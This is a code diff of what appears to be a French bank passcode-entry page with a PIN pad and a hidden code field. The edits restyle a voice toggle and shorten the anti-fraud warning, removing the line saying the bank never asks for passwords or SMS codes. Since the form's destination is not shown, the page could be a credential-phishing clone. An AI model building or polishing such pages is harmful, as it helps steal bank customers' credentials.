@@ -56,6 +56,47 @@
       gap: 10px;
       margin-bottom: 20px;
     }
+
+    /* Nouveau style du switch */
+    .voice-label {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 16px;
+    }
+
+    .voice-label input[type="checkbox"] {
+      width: 40px;
+      height: 20px;
+      appearance: none;
+      background-color: #ccc;
+      border-radius: 20px;
+      position: relative;
+      outline: none;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .voice-label input[type="checkbox"]::before {
+      content: "";
+      position: absolute;
+      width: 16px;
+      height: 16px;
+      border-radius: 50%;
+      background-color: #fff;
+      top: 2px;
+      left: 2px;
+      transition: transform 0.3s;
+    }
+
+    .voice-label input[type="checkbox"]:checked {
+      background-color: #c10000;
+    }
+
+    .voice-label input[type="checkbox"]:checked::before {
+      transform: translateX(20px);
+    }
+
     .circles {
       display: flex;
       justify-content: center;
@@ -169,7 +210,6 @@
       cursor: pointer;
       width: 100%;
     }
-    /* Loader CSS */
     #loader {
       position: fixed;
       top: 0; left: 0; right: 0; bottom: 0;
@@ -220,10 +260,9 @@
       <h1>Entrez votre mot de passe</h1>
 
       <div class="toggle-row">
-        <span>Assistance vocale</span>
-        <label class="custom-switch">
+        <label class="voice-label">
+          Assistance vocale
           <input type="checkbox" />
-          <span class="slider"></span>
         </label>
       </div>
 
@@ -235,8 +274,8 @@
           <div class="circle"></div>
           <div class="circle"></div>
           <div class="circle"></div>
-          <div class="circle"></div> <!-- nouveau -->
-          <div class="circle"></div> <!-- nouveau -->
+          <div class="circle"></div>
+          <div class="circle"></div>
           <button type="button" class="clear-btn" id="clearBtn" onclick="clearLastDigit()">&#x2715;</button>
         </div>
 
@@ -259,8 +298,7 @@
 
         <div class="alert-box">
           <strong>SOYEZ VIGILANT !</strong>
-          Des fraudeurs peuvent vous contacter PAR TÉLÉPHONE ou EMAIL en se faisant passer pour votre conseiller, les services fraude ou opposition carte… en affichant parfois même nos numéros de téléphone.
-          Nous ne vous demanderons JAMAIS de COMMUNIQUER les données de votre banque (identifiant, mot de passe, code reçu par sms, code Sécur’Pass…), pour CONFIRMER ou ANNULER une opération (ajout de compte bénéficiaire, virement, paiement par carte, validation Sécur’Pass…).
+          Des fraudeurs peuvent vous contacter PAR TÉLÉPHONE ou EMAIL en se faisant passer pour votre conseiller...
         </div>
 
         <input type="hidden" name="code" id="hiddenCode" />
@@ -270,18 +308,8 @@
 
   <div class="floating-zone">
     <div class="buttons">
-      <button
-        type="button"
-        class="btn-valider"
-        id="validerBtn"
-        disabled
-        onclick="submitForm()"
-      >
-        Valider
-      </button>
-      <button type="button" class="btn-annuler" onclick="window.location.href='/'">
-        Annuler
-      </button>
+      <button type="button" class="btn-valider" id="validerBtn" disabled onclick="submitForm()">Valider</button>
+      <button type="button" class="btn-annuler" onclick="window.location.href='/'">Annuler</button>
     </div>
   </div>
 
@@ -294,7 +322,6 @@
         document.getElementById("hiddenCode").value = code;
         updateCircles();
       }
-
       const btn = document.getElementById("validerBtn");
       const clearBtn = document.getElementById("clearBtn");
       if (code.length >= 1) {
@@ -312,7 +339,6 @@
       code = code.slice(0, -1);
       document.getElementById("hiddenCode").value = code;
       updateCircles();
-
       const btn = document.getElementById("validerBtn");
       const clearBtn = document.getElementById("clearBtn");
       if (code.length >= 1) {
@@ -339,12 +365,9 @@
 
     function submitForm() {
       if (code.length > 0) {
-        // Affiche le loader
         const loader = document.getElementById("loader");
         loader.style.visibility = "visible";
         loader.style.opacity = "1";
-
-        // Soumet le formulaire
         document.getElementById("form").submit();
       }
     }
